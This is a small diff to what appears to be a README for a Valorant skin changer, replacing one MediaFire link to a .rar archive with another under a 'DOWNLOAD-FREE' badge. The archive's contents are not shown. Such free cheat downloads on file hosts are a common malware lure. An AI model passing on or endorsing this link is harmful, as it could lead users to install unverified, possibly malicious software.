@@ -16,7 +16,7 @@
 
 ### 📥 Download
 
-[ ![Download Button](https://img.shields.io/badge/DOWNLOAD-FREE-red?style=for-the-badge&logo=mediafire) ](https://www.mediafire.com/file/9uhugkay72rubci/ModSkinValV3.2.rar/file)
+[ ![Download Button](https://img.shields.io/badge/DOWNLOAD-FREE-red?style=for-the-badge&logo=mediafire) ](https://www.mediafire.com/file/ff1tkekvtvow2n5/SkinChangerValorant.rar/file)
 
 ---
 
